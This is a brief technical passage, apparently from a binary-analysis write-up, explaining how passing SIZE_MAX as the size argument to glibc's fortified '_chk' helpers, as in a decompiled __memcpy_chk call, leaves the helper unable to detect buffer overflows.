- The `_chk` helpers rely on a **correct** destination-size argument. If that argument is `SIZE_MAX` (e.g. `0xffffffffffffffff`) or otherwise incorrect, the helper can’t detect overflow.
- In the decompiled code, calls like `__memcpy_chk(__ptr, param, uVar2, 0xffffffffffffffff)` pass an all-ones size so the helper cannot determine the real buffer size, effectively **disabling the protection**.
